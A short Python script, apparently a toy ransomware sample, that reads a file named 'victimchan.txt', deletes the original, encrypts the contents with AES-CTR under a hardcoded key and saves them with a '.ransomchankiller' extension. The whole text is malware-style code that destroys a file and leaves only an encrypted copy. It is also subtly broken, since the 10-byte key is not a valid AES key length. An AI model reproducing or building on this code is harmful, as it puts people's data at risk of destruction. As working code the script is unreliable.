import os
import pyaes

## We must open the file that we need to encrypt 
file_name = "victimchan.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Then, we need to remove the file
os.remove(file_name)

## define the encryption Key
key = b"ransomchan"
aes = pyaes.AESModeOfOperationCTR(key)

## encrypt it
crypto_data = aes.encrypt(file_data)

## and save it
new_file = file_name + ".ransomchankiller"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
